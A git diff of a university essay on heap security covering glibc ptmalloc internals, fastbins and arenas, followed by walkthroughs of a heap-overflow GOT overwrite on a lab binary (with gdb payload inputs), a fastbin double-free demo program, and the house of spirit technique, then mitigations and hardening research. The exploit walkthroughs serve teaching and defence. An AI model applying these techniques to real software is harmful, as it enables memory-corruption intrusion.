@@ -1,9 +1,9 @@
 ---
 title: "Protecting the Heap"
-subtitle: "Exploit Development (ZEIT8042) Major Essay"
-date: "September 2019"
+subtitle: "Modern Exploit Development (ZEIT8042) Major Essay"
+date: "October 2019"
 author: "Benjamin Simmonds (5233344) UNSW Canberra"
-abstract: "Heap oriented exploits continue to be an ongoing threat, and have gained popularity post the stack smashing frenzy of the 90's and early 00's. Even so called safe languages (e.g. JavaScript, Java) remain vulnerable due to their underlying C/C++ implementations. Heap allocator designs and implementations, of which there are many, struggle to strike the balance between performance and security, performance often winning out to keep programs running as fast as possible. Two ingredients are needed for a successful heap exploit, the first a memory management error in the target program, and second an exploitable heap allocator implementation. Many countermeasures in mainstream allocators seen to date are often the result knee-jerk reactions to exploits of the past, with patching occurring to existing designs. A large body of research exists around detecting, preventing or mitigating heap attacks."
+abstract: "Heap oriented exploits continue to be an ongoing threat, and have gained popularity post the stack smashing frenzy of the 90's and early 00's. Even so called safe languages (e.g. JavaScript, Java) remain vulnerable due to their underlying C/C++ implementations. Heap allocator designs and implementations, of which there are many, struggle to strike the balance between performance and security, performance often winning out to keep programs running as fast as possible. Two ingredients are needed for a successful heap exploit, the first a memory management error in the target program, and second an exploitable heap allocator implementation. Many countermeasures in mainstream allocators seen to date are often the result of knee-jerk reactions to exploits of the past, with patching occurring to existing designs. A large body of research exists around detecting, preventing or mitigating heap attacks."
 ---
 
 
@@ -24,7 +24,7 @@ strengths and weaknesses of the control. -->
 
 The heap provides a useful general purpose memory abstraction for programmers to obtain and work with computer memory. While users of the heap generally work with high-level API's, it's the role of the heap allocator to take care of liaising with the kernel and managing the memory as required.
 
-Heap allocator designs and implementations, of which there are many, struggle to strike the balance between performance and security, performance often winning out to keep programs running as fast as possible.
+Heap allocator designs and implementations, of which there are many, struggle to strike a balance between performance and security, performance often winning out to keep programs running as fast as possible.
 
 To gain an intuition into the mechanics and tradeoffs of a real world heap allocator, undertake an analysis of the `ptmalloc` (glibc) implementation used by most programs that run on a Linux kernel.
 
@@ -32,7 +32,7 @@ Two ingredients are needed for a successful heap exploit, the first a memory man
 
 Building on top of the analysis of `ptmalloc`, walk through in detail three heap based exploits, starting with a classical heap overflow, a double free with fastbins and the more subtle house of spirit exploit.
 
-Heap exploitation countermeasure do exist, and much work is being done to improve the current security situation of mainstream allocators. An observation of some of the security related enhancements that `ptmalloc` has received in recent year is undertaken, in addition to some big picture research and ideas around disrupting the status quo of heap abuse.
+Heap exploitation countermeasures do exist, and much work is being done to improve the current security situation of mainstream allocators. An observation is undertaken of some of the security related enhancements that `ptmalloc` has received in recent years is undertaken, in addition to some big picture research and ideas around disrupting the status quo of heap abuse.
 
 
 
@@ -106,7 +106,7 @@ While there is no single defacto heap allocator, most platforms congregate aroun
 * `dlmalloc` Doug Lea's general purpose allocator, the original glibc (GNU/Linux) implementation.
 * `ptmalloc2` the present day (since 2006) multi-threaded allocator, the Doug Lea implmentation adapted to multiple threads/arenas by Wolfram Gloger.
 * `kalloc` XNU (X is Not UNIX) the kernel of Darwin used by macOS and iOS
-* `jemalloc` FreeBSD
+* `jemalloc` FreeBSD, Firefox, rustlang
 * `tcmalloc` Google
 * `libumem` Sun Solaris
 * `kmalloc` Linux kernel allocator used for small chunks
@@ -123,7 +123,7 @@ As a general purpose heap allocator provided by glibc, the designers had to stri
 
 > This is not the fastest, most space-conserving, most portable, or most tunable malloc ever written. However it is among the fastest while also being among the most space-conserving, portable and tunable. Consistent balance across these factors results in a good general-purpose allocator for malloc-intensive programs.
 
-Some properties of the `ptmalloc2` algorithm are:
+Some properties of the `ptmalloc2` algorithm are (@glibc):
 
 * For large (>= 512 bytes) requests, it is a pure best-fit allocator, with ties normally decided via FIFO (i.e. least recently used).
 * For small (<= 64 bytes by default) requests, it is a caching allocator, that maintains pools of quickly recycled chunks.
@@ -283,7 +283,7 @@ Straight after `malloc` is invoked, as can be seen below, the magic of the `brk(
 
 
 
-While seeing the high level heap segments is useful, visualising the specific chunks within the heap would be even more useful. There are some excellent options available, for example using gdb paired with the `libheap` (@libheap) extension library arms gdb with heap visualisation abilities. Below can see two chunks exist on the heap, the special *top chunk*, and the 1000 (0x3f0) byte chunk that was requested using first `malloc()` in the above program:
+While seeing the high level heap segments is useful, visualising the specific chunks within the heap would be even more useful. There are some excellent options available, for example using gdb paired with the `libheap` (@libheap) extension library arms gdb with heap visualisation abilities. Below can see two chunks exist on the heap, the special *top chunk*, and the 1000 (`0x3f0`) byte chunk that was requested using first `malloc()` in the above program:
 
     gdb-peda$ heapls
                ADDR             SIZE            STATUS
@@ -307,11 +307,11 @@ In decimal, equates to 135,168 bytes (or 132KB):
 
 ## Arenas
 
-It turns out looking at `malloc.c` that 132KB of heap memory was reserved, regardless that only 1000 bytes was initally requested. This continigous block of memory is known commonly by heap allocators as the *main arena*. The `ptmalloc` allocator will utilise and manage memory from the *main arena* for future allocation requests that come in, re-allocated previously used memory that is no longer needed and growing or shrinking the *main arena* by adjusting the heap segment break location (@kapil).
+It turns out looking at `malloc.c` that 132KB of heap memory was reserved, regardless that only 1000 bytes was initally requested. This contiguous block of memory is known commonly by heap allocators as the *main arena*. The `ptmalloc` allocator will utilise and manage memory from the *main arena* for future allocation requests that come in, re-allocated previously used memory that is no longer needed and growing or shrinking the *main arena* by adjusting the heap segment break location (@kapil).
 
-The *arena* enables allocators abstract the continguous block of memory used to service heap requests, and provides an in-between caching layer so that the kernel doesn't have to get involved every time heap memory is allocated or freed. When a block of previously allocated memory is freed, it returned to `ptmalloc` which organises in a free list, in the case of `ptmalloc` these are known as *bins*. When a subsequent memory request is made, `ptmalloc` will scan its bins for a free block of the size needed. If it fails to locate a free block of the appropriate size, elevates to the kernel to ask for more memory.
+The *arena* enables allocators abstract the contiguous block of memory used to service heap requests, and provides an in-between caching layer so that the kernel doesn't have to get involved every time heap memory is allocated or freed. When a block of previously allocated memory is freed, it returned to `ptmalloc` which organises in a free list, in the case of `ptmalloc` these are known as *bins*. When a subsequent memory request is made, `ptmalloc` will scan its bins for a free block of the size needed. If it fails to locate a free block of the appropriate size, elevates to the kernel to ask for more memory.
 
-What is facinating about the `ptmalloc` allocator, is that when another thread `pthread_create(&t1, NULL, threadFunc, NULL)` makes a memory request using `malloc`, is that a completely new heap segment is created specifically for use by the thread, as can be seen below:
+What is fascinating about the `ptmalloc` allocator, is that when another thread `pthread_create(&t1, NULL, threadFunc, NULL)` makes a memory request using `malloc`, is that a completely new heap segment is created specifically for use by the thread, as can be seen below:
 
     # cat /proc/2685/maps
     08048000-08049000 r-xp 00000000 08:01 653369  /root/code/arena/arena
@@ -407,7 +407,7 @@ Always the first chunk at the top of an arena. It can be allocated, by this is d
 
 ### Last remainder chunk
 
-When exact free chunk sizes are not available, and there sufficient larger chunks avialable, these large chunks will routinely be split into two by the allocator. The first piece is returned to the requesting program that called `malloc()`, where the other piece becomes a last remainder chunk. Last remainder chunks have the benefit of increasing the memory locality of subsequent memory allocations, which can come as a performance boost.
+When exact free chunk sizes are not available, and there sufficient larger chunks available, these large chunks will routinely be split into two by the allocator. The first piece is returned to the requesting program that called `malloc()`, where the other piece becomes a last remainder chunk. Last remainder chunks have the benefit of increasing the memory locality of subsequent memory allocations, which can come as a performance boost.
 
 
 
@@ -472,10 +472,16 @@ The fast bins manage 10 separate bins, as chains (singly linked lists) of free c
 | 0           | 00 - 12           | 16                |
 | 1           | 13 - 20           | 24                |
 | 2           | 21 - 28           | 32                |
+| 3           | 29 - 36           | 40                |
+| 4           | 37 - 44           | 48                |
+| 5           | 45 - 52           | 56                |
+| 6           | 53 - 60           | 64                |
+| 7           | 61 - 68           | 72                |
+| 8           | 69 - 76           | 80                |
+| 9           | 77 - 80           | 88                |
 
-TODO: Complete this table from P10 https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf
 
-*Hold chunk sizes* shows the range of sizes that the bin is capable of holding, with *actual chunk size* being the real size after metadata and alignment of the chunk being freed. Only free chunks that match the size ranges (including metadata) of the bin can be added to it.
+The *hold chunk sizes* column shows the range of sizes that the bin is capable of holding, with the *actual chunk size*  column being the real size after metadata and alignment of the chunk being freed. Only free chunks that match the size ranges (including metadata) of the bin can be added to it.
 
 Given that the free chunks are daisy chained together as a singly linked list, a side-effect of this is that all free chunk addition and removal operations occur at the head/front of the list (LIFO). That is, the last free chunk added to a list, will be the first one used for an allocation.
 
@@ -524,7 +530,7 @@ Each bin (i.e. unsorted, small and large) is defined as two values, the head and
 
 Heap allocators have a broad attack surface. This surface is significantly widens as multiple heap allocator implementations across languages and platforms are considered, with `ptmalloc` being just one. Implementation differences aside do have some themes in common. The *how2heap* (@how2heap) online listing for example, thoroughly documents glibc `ptmalloc` heap vulnerabilities, many of which are applicable to other allocator implementations.
 
-A whole family of attacks focuses on exploiting the allocator algorithms itself, such as a particular fastbin or smallbin implementation. The goal of the attacker to establish an arbitrary (or close to it) pointer and/or code execution. Arbitrary pointers are particularly dangerous, as they can be used to manipulate and often own control flow of the target program. One particurly example of this is the *house of spirit* exploit, the mechanics of it are walked through in section 3 below. Common mis-uses of the heap that open the door to crafting a heap exploit include (@novark2010dieharder):
+A whole family of attacks focuses on exploiting the allocator algorithms itself, such as a particular fastbin or smallbin implementation. The goal of the attacker to establish an arbitrary (or close to it) pointer and/or code execution. Arbitrary pointers are particularly dangerous, as they can be used to manipulate and often own control flow of the target program. One particular example of this is coined *the house of spirit* exploit, analysed further in section 3 below. Common misuses of the heap that open the door to crafting a heap exploit include (@novark2010dieharder):
 
 * *Heap overflow/underflow*, when a heap chunk is too small to hold the data.
 * *Dangling pointers* (aka use after free), is when a program prematurely frees a heap chunk, but later makes use of it.
@@ -533,7 +539,7 @@ A whole family of attacks focuses on exploiting the allocator algorithms itself,
 * *Unitialised reads*, when a program blindly reads from a newly allocated heap.
 
 
-To highlight the diversity and breadth of attacks posssible on the heap, consider three different categories of attack on the glibc heap allocator, starting with a simple overflow to attack control flow, a double free attack and finally a more sophisticated attack that involves storing specially crafted fake heap chunks in fastbins.
+To highlight the diversity and breadth of attacks posssible on the heap, consider three different categories of attack on the glibc heap allocator, starting with a simple overflow to attack control flow, a double free attack and finally a more sophisticated attack (house of spirit) that involves storing a specially crafted fake heap chunk into the fastbins.
 
 
 
@@ -589,7 +595,8 @@ However with inputs that exceed the 8 byte allocated heap chunks:
 
     gdb-peda$ r AAAABBBBCCCCDDDDEEEEFFFFGGGG 000011112222333344445555
     Stopped reason: SIGSEGV
-    *__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffffe66 "000011112222333344445555") at strcpy.c:40
+    *__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, \
+        src=0xbffffe66 "000011112222333344445555") at strcpy.c:40
 
 Segfaults. Noting the dest of the `strcpy` now has an address of `0x46464646` (or the FFFF characters from the first input argument). Given that we can control the destination address (offset of the FFFF characters), and source data by overflowing enough of the heap segment, have an *arbitary write to anywhere* vulnerability.
 
@@ -597,9 +604,10 @@ A real world attack could involve mutating one of the GOT (global offset table) 
 
 
     gdb-peda$ backtrace
-    #0  *__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffffe66 "000011112222333344445555") at strcpy.c:40
+    #0  *__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, \
+        src=0xbffffe66 "000011112222333344445555") at strcpy.c:40
     #1  0x080485ad in main (argc=0x3, argv=0xbffffd14) at main.c:30
-    #2  0xb7e8de46 in __libc_start_main (main=0x8048510 <main>, argc=0x3, ubp_av=0xbffffd14, init=0x80485d0 <__libc_csu_init>)
+    #2  0xb7e8de46 in __libc_start_main (main=0x8048510 <main>, argc=0x3)
     #3  0x08048421 in _start ()
 
 
@@ -651,7 +659,8 @@ Placing the address of the desired instruction to be executed is now trivial, fo
 
 Now to write the address of `winner()` into the EIP:
 
-    gdb-peda$ r "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x44\x98\x04\x08"`" "`/bin/echo -ne "\xec\x84\x04\x08"`"
+    gdb-peda$ r "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x44\x98\x04\x08"`" \
+        "`/bin/echo -ne "\xec\x84\x04\x08"`"
     and we have a winner @ 1570881614
 
 To gain a better intuition about what is going here. Set breakpoints after each `malloc` call. The first break is hit:
@@ -670,7 +679,7 @@ To visualise the heap segment further, need its segment address:
              0x8049000  0x804a000     0x1000          0      /root/code/heap1/heap1
              0x804a000  0x806b000    0x21000          0           [heap]
             0xb7e76000 0xb7e77000     0x1000          0
-            0xb7e77000 0xb7fd3000   0x15c000          0      /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+            0xb7e77000 0xb7fd3000   0x15c000          0      /lib/cmov/libc-2.13.so
 
 Can see the heap is mapped between addresses `0x804a000` to `0x806b000`:
 
@@ -762,10 +771,11 @@ int main()
 	free(a);
 	fprintf(stderr, "So, instead, we'll free %p.\n", b);
 	free(b);
-	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
+	fprintf(stderr, "Now, we can free %p again, now it's head of free list.\n", a);
 	free(a);
 
-	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
+	fprintf(stderr, "Now the free list has [ %p, %p, %p ]\n", a, b, a);
+    fprintf(stderr, "If we malloc 3 times, we'll get %p twice!\n", a);
 	fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
 	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
 	fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
@@ -779,10 +789,10 @@ Outputs:
     2nd malloc(8): 0x9214018
     3rd malloc(8): 0x9214028
     Freeing the first one...
-    If we free 0x9214008 again, things will crash because 0x9214008 is at the top of the free list.
     So, instead, we'll free 0x9214018.
-    Now, we can free 0x9214008 again, since it's not the head of the free list.
-    Now the free list has [ 0x9214008, 0x9214018, 0x9214008 ]. If we malloc 3 times, we'll get 0x9214008 twice!
+    Now, we can free 0x9214008 again, now it's head of free list.
+    Now the free list has [ 0x9214008, 0x9214018, 0x9214008 ]
+    If we malloc 3 times, we'll get 0x9214008 twice!
     1st malloc(8): 0x9214008
     2nd malloc(8): 0x9214018
     3rd malloc(8): 0x9214008
@@ -794,7 +804,7 @@ As expected, the chunk `0x9214008`, after being freed twice, was subsequently re
 
 ## The House of Spirit
 
-A clever heap exploit, that builds up a *write to anywhere* primitive, by crafting a fake heap chunk and stores it back into fastbins via a `free()`. Later, the specially crafted fake chunk is is allocated back to the vulnerable program through a subsequent `malloc()` call. Control flow can be hijacked if the code that uses the second `malloc()'ed` fake chunk, attempts to mutate the user data within the fake heap chunk which is laid out on the stack (@phrack).
+A clever heap exploit, that builds up a *write to anywhere* primitive, by crafting a fake heap chunk and stores it back into fastbins via a `free()`. Later, the specially crafted fake chunk is is allocated back to the vulnerable program through a subsequent `malloc()` call. Control flow can be hijacked if the code that uses the second `malloc()'ed` fake chunk, attempts to modify the user data within the fake heap chunk, which by design is laid out across stack memory (@phrack).
 
 To add a complication, `ptmalloc` performs an integrity check, which must be satisified:
 
@@ -868,7 +878,7 @@ So that the fake chunk is handled correctly by glibc, before the fake chunk is `
 Finally in order to make this work the memory the of the crafted fake chunk must be 16-byte aligned, as glibc would do for chunks it produces.
 
 
-While the above @how2heap example does nothing harmful, it easy to imagine how an arbitary memory location could be corrupted with this technique. @phrack for example walks through laying out the fake chunk over stack, to gain control of the EIP:
+While the above @how2heap example does nothing harmful, it easy to imagine how an arbitary memory location could be corrupted with this technique. @phrack for example walks through overlaying the fake chunk across stack memory, to gain control of the EIP:
 
                      val1         target                val2
                       o             |                     o
@@ -881,11 +891,13 @@ While the above @how2heap example does nothing harmful, it easy to imagine how a
                          PTR1
                           |---> Future PTR2
                                        ----
-  
-     (target) Value to overwrite.
-     (mem)  Data of fakechunk.
-     (val1) Size of fakechunk.
-     (val2) Size of next chunk.
+
+Key components of the chunk layout:
+
+* `target` value to overwrite.
+* `mem` data of fake chunk.
+* `val1` size of fake chunk.
+* `val2` size of next chunk.
 
 
 
@@ -894,14 +906,13 @@ While the above @how2heap example does nothing harmful, it easy to imagine how a
 
 # Mitigations
 
-
-A large body of research exists around detecting, preventing or mitigating heap attacks. Many typically incur a large performance overhead, and focus on tackling specific types of heap vulnerabilities. Some examples include *MemorySanitizer* a dynamic analysis tool that detects uninitialised reads, at the cost of a 2.5x slowdown and 2x memory overhead, or *AddressSanitizer* targets detecting overflows and use after frees, incurs a 73% slowdown and 3.4x memory increase. Other solutions like *HeapTherapy* propose efficient heap overflow detection, however provide no protections against unitialised reads or use after free vulnerbilities (@zeng2018codeless).
+A large body of research exists around detecting, preventing or mitigating heap attacks. Many typically incur a large performance overhead, and focus on tackling specific types of heap vulnerabilities. Some examples include *MemorySanitizer* a dynamic analysis tool that detects uninitialised reads, at the cost of a 2.5x slowdown and 2x memory overhead, or *AddressSanitizer* targets detecting overflows and use after frees, incurs a 73% slowdown and 3.4x memory increase. Other solutions like *HeapTherapy* propose efficient heap overflow detection, however provide no protections against uninitialised reads or use after free vulnerabilities (@zeng2018codeless).
 
 
 <!--
 Paper checklist:
 
-[] Automatic Heap Layout Manipulation for Exploitation.pdf
+[x] Automatic Heap Layout Manipulation for Exploitation.pdf
 [] Automatic Techniques to Systematically Discover New Heap Exploitation Primitives.pdf
 [x] Code-less Patching for Heap Vulnerabilities Using Targeted Calling Context Encoding.pdf
 [] Detecting Heap Smashing Attacks Through Fault Containment Wrappers (2001).pdf
@@ -913,9 +924,54 @@ Paper checklist:
 -->
 
 
+## Secure Coding Guidelines
+
+Two ingredients are needed for a successful heap exploit, the first a memory management error in the target program (e.g. heap overflows/underflows, use after frees, double frees, invalid frees and uninitialised reads), and second an exploitable heap allocator implementation (@novark2010dieharder).
+
+Assuming memory management errors within program code could be reduced or eliminated in the first place, would close the door on many heap related exploits that occur. Some options to support in this cause include establishing education and training, secure coding standards, statically verifying source code with linters and evaluating the target binary on a dynamic analysis runtime (such as valgrind).
+
+When it comes to working with the heap, the following mantras must be obeyed:
+
+* Only ever use the amount of memory requested by `malloc`, and no more.
+* Only ever `free` memory that was allocated by you, once.
+* Never access freed memory.
+* Always check the return value of `malloc` for `NULL`.
+* Never assume the state memory is when returned by `malloc`.
+* After `free`, `NULL` all pointers to it.
+* Zero sensative memory before freeing.
 
 
-## Free list pointer authentication
+
+## Heap Allocator Hardening
+
+Existing heap allocators have decades of maturity behind their designs and implementations. Simply throwing them away is not feasible. @glibc maintains a change log of features and fixes that go into the GNU C Library, the codebase that contains the heap allocator implementation. The heap allocator (`ptmalloc2`) implementation in recent years has received a number of security related enhancements. A (non-exhaustive) summary of some of the major improvements to the glibc allocator include (@kapil):
+
+| Bug | Improvement |
+| --------- | --------------- |
+| `unlink`: corrupted size vs prev_size | Whether chunk size is equal to the previous size set in the next chunk (in memory) |
+| `unlink`: corrupted doubly linked list | Whether P->fd->bk == P and P->bk->fd == P* |
+| `malloc`: memory corruption (fast) | While removing the first chunk from fastbin, check whether the size of the chunk falls in fast chunk size range |
+| `malloc`: smallbin double linked list corrupted | While removing the last chunk (victim) from a smallbin, check whether victim->bk->fd and victim are equal |
+| `malloc`: memory corruption | While iterating in unsorted bin, check whether size of current chunk is within minimum (2*SIZE_SZ) and maximum (av->system_mem) range |
+| `malloc`: corrupted unsorted chunks | While inserting last remainder chunk into unsorted bin (after splitting a large chunk), check whether unsorted_chunks(av)->fd->bk == unsorted_chunks(av) |
+| `malloc`: corrupted unsorted chunks 2 | While inserting last remainder chunk into unsorted bin (after splitting a fast or a small chunk), check whether unsorted_chunks(av)->fd->bk == unsorted_chunks(av) |
+| `free`: invalid pointer | Check whether p** is before p + chunksize(p) in the memory (to avoid wrapping) |
+| `free`: invalid size | Check whether the chunk is at least of size MINSIZE or a multiple of MALLOC_ALIGNMENT |
+| `free`: invalid next size (fast) | For a chunk with size in fastbin range, check if next chunk's size is between minimum and maximum size (av->system_mem) |
+| `free`: double free or corruption (fasttop) | While inserting fast chunk into fastbin (at HEAD), check whether the chunk already at HEAD is not the same |
+| `free`: invalid fastbin entry (free) | While inserting fast chunk into fastbin (at HEAD), check whether size of the chunk at HEAD is same as the chunk to be inserted |
+| `free`: double free or corruption (top) | If the chunk is not within the size range of fastbin and neither it is a mmapped chunks, check whether it is not the same as the top chunk |
+| `free`: double free or corruption (out) | Check whether next chunk (by memory) is within the boundaries of the arena |
+| `free`: double free or corruption (!prev) | Check whether next chunk's (by memory) previous in use bit is marked |
+| `free`: invalid next size (normal) | Check whether size of next chunk is within the minimum and maximum size (av->system_mem) |
+| `free`: corrupted unsorted chunks | While inserting the coalesced chunk into unsorted bin, check whether unsorted_chunks(av)->fd->bk == unsorted_chunks(av) |
+
+
+As demonstrated by @how2heap, the latest allocator 2.30 (as of 2019-10-19) thwarts a large number of common heap based attacks, but is not full proof.
+
+
+
+## Free List Pointer Authentication
 
 One proposal is to authenticate the integrity of data pointers used to chain free chunks together in the various free list data structures (i.e. singly and doubly linked lists). "In our scheme, the dynamic memory manager encrypts a pointer linking free chunks immediately after it is defined, that is, assigned with an address, and decrypts the pointer only when its necessary to know the real addresses, before dereferencing." (@kim2012securing).
 
@@ -924,12 +980,12 @@ One proposal is to authenticate the integrity of data pointers used to chain fre
 The next free chunk `fd` pointer is encoded with encoding function `e` and key `k`. For encryption and decryption an exclusive-OR (XOR) operation is recommended, as XOR operations can be performed as a single ALU instruction in most microprocessors, striking a balance between performance of this low-level but frequent heap operation, and the security benefits it brings.
 
 
-## Dynamic analysis
+## Dynamic Analysis
 
-Heap allocation is by it's nature, dynamic, and as a consequence is something that takes place at runtime. It is difficult to draw concrete observations about it nature statically. One approach (@chilimbi2006heapmd) proposes running the program under a dynamic analysis runtime. As the program executes, allocating, using and freeing heap memory, several properties of the heap graph as it evolves (e.g. % of vertexes with indegree == outdegree, % of leaves and roots) are modelled. The research (@chilimbi2006heapmd) highlights that despite the fluid and seemingly chaotic behaviour of the heap allocator, several properties remain stable. Several models of heap behaviour are captured by running the program against a variety of input data, which using an anomoly detection algorithm can determine the degree of variation to heap stability rating. An unstable anomoly, is very likely a heap based bug either through misuse or malicious.
+Heap allocation is by its nature, dynamic, and as a consequence is something that takes place at runtime. It is difficult to draw concrete observations about it nature statically. One approach (@chilimbi2006heapmd) proposes running the program under a dynamic analysis runtime. As the program executes, allocating, using and freeing heap memory, several properties of the heap graph as it evolves (e.g. % of vertices with indegree == outdegree, % of leaves and roots) are modelled. The research (@chilimbi2006heapmd) highlights that despite the fluid and seemingly chaotic behaviour of the heap allocator, several properties remain stable. Several models of heap behaviour are captured by running the program against a variety of input data, which using an anomaly detection algorithm can determine the degree of variation to heap stability rating. An unstable anomaly, is very likely a heap based bug either through misuse or malicious.
 
 
-## Secure allocators
+## Secure Allocators
 
 @silvestro2017freeguard observes the lack of progress around preventing heap related attacks, and how (as of 2017) remain a severe threat. The cause, is that todays heap allocators struggle to strike a balance between performance, memory efficiency and security. If an allocator focuses on delivery great performance, it often comes at the cost of security and/or memory efficiency. Security focused allocators trade-off performance, not uncommon to be an order of magnitude slower than their performance focused counterparts. The research rooted FreeGuard heap allocator (@silvestro2017freeguard) is capable of preventing heap overflows, heap over reads, use after frees, double frees and invalid frees, while providing a performance profile similar (+/- 2%) to the glibc `ptmalloc` allocator.
 
@@ -946,15 +1002,29 @@ In a similar vein to FreeGuard, heap allocator "DieHarder", proposes a heap allo
 
 ## Patching
 
-When it comes to the field of patching of heap related vulnerabilities in programs, there is much smaller body of research available. The conventional patch cycle of vulnerable software tends to be a lengthy process, taking large vendors an average of 153 days from vulnerability discovery to patch avilability (@zeng2018codeless).
+When it comes to the field of patching of heap related vulnerabilities in programs, there is a much smaller body of research available. The conventional patch cycle of vulnerable software tends to be a lengthy process, taking large vendors an average of 153 days from vulnerability discovery to patch availability (@zeng2018codeless).
 
-@zeng2018codeless propose an automatic "code-less" patching system that specifically targets heap vulnerabilities. The system, is made up of 3 stages. The first is a one-time *program instrumentation* effort which instruments the target program using calling context encoding. The second *patch generation* stage uses the instrumented version of the program, to automatically generates any necessary patches by evaluting attacks on detected vulnerabilities, this output is stored in a patch configuration file. The third and final *defense generation* stage, involves running the program with extra protection functionality provided in the form as a shared (i.e. dynamically linked) library, which is responsible for loading patches from the patch configuration file and intercepting vulerable heap allocation operations and mitigating them at runtime.
+@zeng2018codeless propose an automatic "code-less" patching system that specifically targets heap vulnerabilities. The system is made up of 3 stages. The first is a one-time *program instrumentation* effort which instruments the target program using calling context encoding. The second *patch generation* stage uses the instrumented version of the program, to automatically generates any necessary patches by evaluating attacks on detected vulnerabilities, this output is stored in a patch configuration file. The third and final *defense generation* stage, involves running the program with extra protection functionality provided in the form as a shared (i.e. dynamically linked) library, which is responsible for loading patches from the patch configuration file and intercepting vulnerable heap allocation operations and mitigating them at runtime.
 
-Some benefits of this dynamic patching approach, mean that patching can occur without the manual overheads of a formal patching cycle from a vendor, don't involve modifying any code of the program itself, can deal with all types of heap attacks, imposes overhead only on heap operations that are deemed vulnerable through the instrumentation process (i.e. non-vulnerable operations are not intersepted), and perhaps the most powerful property is that this approach is agnostic of a specific heap allocator.
+Some benefits of this dynamic patching approach, mean that patching can occur without the manual overheads of a formal patching cycle from a vendor, don't involve modifying any code of the program itself, can deal with all types of heap attacks, imposes overhead only on heap operations that are deemed vulnerable through the instrumentation process (i.e. non-vulnerable operations are not intercepted), and perhaps the most powerful property is that this approach is agnostic of a specific heap allocator.
+
+
+## Heap Layout Manipulation
+
+@heelan2018automatichlm present a novel approach to identifying heap corruption vulnerabilities, using automated heap layout manipulation (HLM) to stress the heap allocator. A psudeo-random based search algorithm searches for certain program inputs needed to place or align the source of a heap based overflow next to heap-allocated objects of interest, that an attacker ultimately aims to read or corrupt. Despite the overwhelming magnitude of the problem space of solving heap layout problems, such as the number of possible combinations of heap interactions, there exists significant symmetry in the solution space for many problem instances (P4, @heelan2018automatichlm).
+
+Since heap layout manipulation is interested on the relative positioning of two buffers, @heelan2018automatichlm hypothesise that neither the absolute location of the two buffers or their relative position to other buffers matters, and the order in which holes (i.e. fragmentation gaps within the heap space) are created or filled does not matter. @heelan2018automatichlm go on to demonstrate that it is feasible to locate a sufficiently large number of problem instances, by using a psuedo-random black box search against any heap allocator that exposes the standard ANSI interface (i.e. `malloc`, `free`, `calloc` and `realloc`) for dynamic memory allocation.
+
 
 
 
 # Conclusion
+
+Heap based memory corruption exploits continue to be an ongoing threat, and have gained popularity post the stack smashing frenzy of the 90's and early 00's. Heap memory corruption differs significantly from stack based memory corruption. On the stack the corruptible data is limited to what can be placed on the stack in order to mutate the execution path needed to invoke the exploit. When it comes to heap memory, in order to corrupt it in a useful manner, it's the physical layout of dynamically allocated chunks that determines the scope of what is corruptible. The successful attacker must therefore reason about the heap layout to craft an exploit.
+
+Modern heap allocator designs, such as `ptmalloc2`, struggle to provide absolute security in the tradeoff of delivering decent performance characteristics. A slow, but secure heap allocator likely would not be tolerated by the masses. Other allocators, such as the OpenBSD allocator, adjust this balance trading off some performance traits for better security.
+
+While there exists an impressive body of research and design into effective heap attack mitigations, there is no one size fits all solution available. A pragmatic approach to working with the heap can be taken, depending on the nature of the software, environment and workload, various heap management options can be weighed up and traded off to meet the performance, efficiency and security goals required.
 
 
 
